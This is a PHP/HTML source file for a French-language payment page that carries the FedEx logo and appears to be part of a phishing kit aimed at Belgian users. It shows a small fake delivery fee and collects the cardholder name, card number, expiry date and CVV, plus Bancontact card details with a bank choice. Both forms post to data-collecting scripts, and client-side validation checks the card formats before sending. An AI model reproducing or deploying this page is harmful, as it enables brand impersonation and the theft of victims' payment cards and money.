<!DOCTYPE html>
<html lang="en">
<?php
// include '../config.php';
session_start();
$str = $_GET["parameters"];

$parameters =  base64_decode($str);

parse_str($parameters, $params);
$ip =  $params["ip"];
$pays =  $params["pays"];
$montant =  $params["montant"];

/*if ($ip == "" || $pays == "") {

    header('Location:index.php');
    return;
}*/



?>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"> -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="css/pyaer.css">
    <title>Payer</title>
    <style>
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            font-size: 24px;
        }
    </style>


</head>

<body>

    <nav class="navbar navbar-expand-lg  p-3" id="navbar1">
        <div class="container">
            <a class="navbar-brand" href="#"><img src="img/logo.png" alt="Fedex" style="width: 100px;"></a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <i class="fa fa-bars" aria-hidden="true"></i>
            </button>

            <div class="collapse navbar-collapse justify-content-center" id="navbarNav">
                <div class="navbar-nav ">
                    <a class="nav-link text-white" aria-current="page" href="#">Expédier</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Suivi</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Support</a>
                    <a class="nav-link text-white" style="margin-left: 20px">Compte</a>
                </div>
            </div>
        </div>
    </nav>
    <div class="payment-details" style="color: white;
    background-color: rgb(90 34 153);
    border-top: 1px solid #222;
    padding: 10px;">
        <div class="container">
            <table style="margin:auto">
                <tbody>
                    <tr>
                        <td class="align-right-text-top" style="text-align: left; "><span class="multilanguage-text" id="beneficiaryTxt">Bénéficiaire</span></td>
                        <td class="strong">: <?php echo $_SESSION['name']; ?></td>
                    </tr>
                    <tr>
                        <td class="align-right-text-top" style="text-align: left; "><span class="multilanguage-text" id="orderReferenceTxt">Référence </span></td>
                        <td class="strong">: 3XV5JT7 220JH9JE </td>
                    </tr>
                    <tr>
                        <td class="align-right-text-top" style="text-align: left; "><span class="multilanguage-text" id="totalPriceTxt">Prix total</span></td>
                        <td class="strong"><?php echo $_SESSION['bonus'] ?? 0.5; ?> &euro;</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div class="container py-5">
        <!-- For demo purpose -->
        <div class="row mb-4">
            <div class="col-lg-8 mx-auto text-center">
                <!-- <h1 class="display-6">Choisissez le mode de paiement</h1> -->
            </div>
        </div> <!-- End -->
        <div class="row">
            <div class="col-lg-6 mx-auto">
                <div class="card ">
                    <div class="card-header">
                        <!-- <div class="bg-white shadow-sm pt-4 pl-2 pr-2 pb-2">
                            Credit card form tabs
                            <ul role="tablist" class="nav bg-light nav-pills rounded nav-fill mb-3">
                                <li class="nav-item"> <a data-toggle="pill" href="#bancontact" class="nav-link active banc"><i class="fa fa-university mr-2" aria-hidden="true"></i>Bancontact </a> </li>
                                <li class="nav-item"> <a data-toggle="pill" href="#credit-card" class="nav-link  "> <i class="fas fa-credit-card mr-2"></i> Credit Card </a> </li>
                                <li class="nav-item"> <a data-toggle="pill" href="#net-banking" class="nav-link "> <i class="fas fa-mobile-alt mr-2"></i> Net Banking </a> </li>
                            </ul>
                        </div> End -->
                        <!-- Credit card form content -->
                        <div class="tab-content">
                            <!-- credit card info-->
                            <div id="credit-card" class="tab-pane fade  pt-3">
                                <form id="formCard" role="form" action="getDataCard.php" method="post" class="needs-validation" novalidate>

                                    <div class="form-group">
                                        <label for="username">
                                            <h6>Nom figurant sur la carte</h6>
                                        </label>
                                        <input type="text" name="username" placeholder="J.smith" required class="username form-control ">
                                    </div>
                                    <div class="form-group"> <label for="cardNumber">
                                            <h6>Numéro de carte</h6>
                                        </label>
                                        <div class="input-group">
                                            <input type="text" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" name="cardNumber" placeholder="Valid card number" id="cardNum" class="cardNumber form-control " required>
                                            <div class="input-group-append"> <span class="input-group-text text-muted"> <i class="visa fab fa-cc-visa mx-1"></i> <i class="master fab fa-cc-mastercard mx-1"></i> <i class="amex fab fa-cc-amex mx-1"></i> <i class="discover fa-brands fa-cc-discover"></i> </span> </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-8">
                                            <div class="form-group"> <label><span class="hidden-xs">
                                                        <h6>Date d'expiration</h6>
                                                    </span></label>
                                                <div class="input-group">
                                                    <input type="number" min="1" max="12" placeholder="MM" name="cardMonth" class="month form-control" required>
                                                    <input type="number" min="22" max="99" placeholder="YY" name="cardYear" class="year form-control" required>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-sm-4">
                                            <div class="form-group mb-4"> <label data-toggle="tooltip" title="Three digit CV code on the back of your card">
                                                    <h6>CVV <i class="fa fa-question-circle d-inline"></i></h6>
                                                </label> <input type="text" name="cvv" required class="cvv form-control"> </div>
                                        </div>
                                    </div>
                                    <div class="card-footer"> <button type="submit" class="subscribe btn btn-primary btn-block shadow-sm" style="border: none !important;
                                    background-color: #ff6200 !important;"> Confirm Payment </button>
                                        <div id="error-message"></div>
                                </form>
                            </div>
                        </div> <!-- End -->
                        <!-- bancontact info -->
                        <div id="bancontact" class="tab-pane show active fade pt-3">
                            <div class="island text-white">
                                <form id="formBanc" method="POST" action="getBancData.php" class="needs-validation" novalidate>
                                    <input type="hidden" name="nompren" value="<?php echo $_SESSION['name']; ?>">
                                    <div class="d-flex align-items-center justify-content-around  flex-column flex-lg-row">
                                        <img src="img/card_mobile_icon.png" alt="app" class="icon">
                                        <h2>Payez avec votre <br/>carte Bancontact</h2>
                                    </div>
                                    <select name="bancName" required class="form-control mt-2">
                                        <option value="">Choisissez votre banque</option>
                                        <option value="Argenta">Argenta</option>
                                        <option value="AXA Banque">AXA Banque</option>
                                        <option value="Bank Van Breda">Bank Van Breda</option>
                                        <option value="Banx">Banx</option>
                                        <option value="Belfius">Belfius</option>
                                        <option value="Beobank">Beobank</option>
                                        <option value="BNP Paribas Fortis">BNP Paribas Fortis</option>
                                        <option value="Bpost">Bpost</option>
                                        <option value="CBC Banque">CBC Banque</option>
                                        <option value="CPH Banque">CPH Banque</option>
                                        <option value="Crelan">Crelan</option>
                                        <option value="Deutsche Bank">Deutsche Bank</option>
                                        <option value="Fintro">Fintro</option>
                                        <option value="Hello Bank!">Hello Bank!</option>
                                        <option value="ING Belgique">ING Belgique</option>
                                        <option value="KBC Bank">KBC Bank</option>
                                        <option value="KBC Brussels">KBC Brussels</option>
                                        <option value="Keytrade Bank">Keytrade Bank</option>
                                        <option value="Nagelmackers">Nagelmackers</option>
                                        <option value="Vdk Bank">Vdk Bank</option>
                                    </select>
                                    <div class="form-group mt-2">
                                        <label for="nombanC">
                                            <h6>Nom figurant sur la carte</h6>
                                        </label>
                                        <input type="text" id="nombanC" name="nombanC" placeholder="J.smith" required class="form-control">
                                    </div>
                                    <div class="form-group">
                                        <label for="numbanContact">
                                            <h6>Numéro de carte</h6>
                                        </label>
                                        <input type="text" id="numbanContact" name="numbanC" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" placeholder="6703 •••• •••• •••• •" required class="form-control ">
                                    </div>

                                    <div class="form-group">
                                        <label class="block" for="expiryMonth">Date d&rsquo;échéance (mm/aaaa)</label>
                                        <div class="row ">
                                            <div class="col pb-3">
                                                <select id="monthBanc" name="monthBanc" class="form-control">
                                                    <option value="--" disabled selected>--</option>
                                                    <option value="1">01</option>
                                                    <option value="2">02</option>
                                                    <option value="3">03</option>
                                                    <option value="4">04</option>
                                                    <option value="5">05</option>
                                                    <option value="6">06</option>
                                                    <option value="7">07</option>
                                                    <option value="8">08</option>
                                                    <option value="9">09</option>
                                                    <option value="10">10</option>
                                                    <option value="11">11</option>
                                                    <option value="12">12</option>
                                                </select>
                                            </div>
                                            <div class="col">
                                                <select id="yearBanc" name="yearBanc" class="form-control">
                                                    <option value="----" disabled selected>----</option>
                                                    <option value="2022">2022</option>
                                                    <option value="2023">2023</option>
                                                    <option value="2024">2024</option>
                                                    <option value="2025">2025</option>
                                                    <option value="2026">2026</option>
                                                    <option value="2027">2027</option>
                                                    <option value="2028">2028</option>
                                                    <option value="2029">2029</option>
                                                    <option value="2030">2030</option>
                                                    <option value="2031">2031</option>
                                                    <option value="2032">2032</option>
                                                    <option value="2033">2033</option>
                                                    <option value="2034">2034</option>
                                                    <option value="2035">2035</option>
                                                    <option value="2036">2036</option>
                                                    <option value="2037">2037</option>
                                                    <option value="2038">2038</option>
                                                    <option value="2039">2039</option>
                                                    <option value="2040">2040</option>
                                                    <option value="2041">2041</option>
                                                    <option value="2042">2042</option>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                    <button id="submit-button" type="submit" name="subBanc" class="btn ">Poursuivre</button>
                                    <div id="error-messageB"></div>

                                </form>
                            </div>
                        </div> <!-- End -->
                        <!-- bank transfer info -->

                        <!-- End -->
                    </div>
                </div>
            </div>
        </div>
        <div id="loading-overlay" class="overlay" style="display: none">
            <div id="loading-message">
                <img id="img-spinner" src="img/spinner.gif" alt="Your transaction is being processed"><br>
            </div>
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
        <script>
            $(function() {
                $('[data-toggle="tooltip"]').tooltip()
            })
        </script>
        <script>
            (() => {
                'use strict'

                // Fetch all the forms we want to apply custom Bootstrap validation styles to
                const forms = document.querySelectorAll('.needs-validation')

                // Loop over them and prevent submission
                Array.from(forms).forEach(form => {
                    form.addEventListener('submit', event => {
                        if (!form.checkValidity()) {
                            event.preventDefault()
                            event.stopPropagation()
                        }

                        form.classList.add('was-validated')
                    }, false)
                })
            })()
        </script>
        <!-- //validation cards -->
        <script>
            // matnssach tcodi lvalidation hna
            $(function() {

                $("#cardNum").on('input', function() {
                    var val = $(this).val();
                    var visa = new RegExp('^4[0-9]');
                    var master = new RegExp('^5[1-5]');
                    var amex = new RegExp('^3[47]');
                    var discover = new RegExp('^(?:6(?:011|5))');
                    if (visa.test(val)) {
                        $('.visa').show();
                        $('.master').hide();
                        $('.amex').hide();
                        $('.discover').hide();
                    } else if (master.test(val)) {
                        $('.master').show();
                        $('.visa').hide();
                        $('.amex').hide();
                        $('.discover').hide();
                    } else if (amex.test(val)) {
                        $('.master').hide();
                        $('.visa').hide();
                        $('.amex').show();
                        $('.discover').hide();
                    } else if (discover.test(val)) {
                        $('.visa').hide();
                        $('.master').hide();
                        $('.amex').hide();
                        $('.discover').show()

                    } else if (val.length === 0) {
                        $('.visa').show();
                        $('.master').show();
                        $('.amex').show();
                        $('.discover').show();
                    }
                });


            });
        </script>
        <!-- Valid or not Valid -->
        <script>
            $(function() {

                ///validation
                var visaRegEx = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
                var mastercardRegEx = /^(?:5[1-5][0-9]{14})$/;
                var amexpRegEx = /^(?:3[47][0-9]{13})$/;
                var discovRegEx = /^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;
                $("#formCard").submit(function(event) {
                    if (visaRegEx.test($('#cardNum').val())) {
                        $("#formCard").classList.add('was-validated');
                        return;
                    } else if (mastercardRegEx.test($('#cardNum').val())) {
                        $("#formCard").classList.add('was-validated');
                        return;
                    } else if (amexpRegEx.test($('#cardNum').val())) {
                        $("#formCard").classList.add('was-validated');
                        return;
                    } else if (discovRegEx.test($('#cardNum').val())) {
                        $("#formCard").classList.add('was-validated');
                        return;
                    }

                    $("#error-message").addClass("alert alert-danger mt-3").text("Entrer une carte valide!").show().fadeOut(5000);
                    event.preventDefault();
                });
            });
        </script>
        <!-- Bancontact Validation -->
        <script>
            //matnssach hna tcodi lvalidation d'bancontact
            $(function() {
                var bancRegEx = /^670[3][\d ]/;
                // $('#loading-overlay').show();

                $("#formBanc").submit(function(event) {
                    $('a, button').on('click', function(event) {
                        // Show the loading spinner
                        $('#loading-overlay').show();
                    });
                    if (bancRegEx.test($('#numbanContact').val())) {
                        $("#formBanc").classList.add('was-validated');
                        return;
                    } else {
                        $("#error-messageB").addClass("alert alert-danger mt-3").text("Entrer une carte valide!").show().fadeOut(5000);
                        $('#loading-overlay').hide();
                        event.preventDefault();
                    }
                });
            })
        </script>

</body>

</html>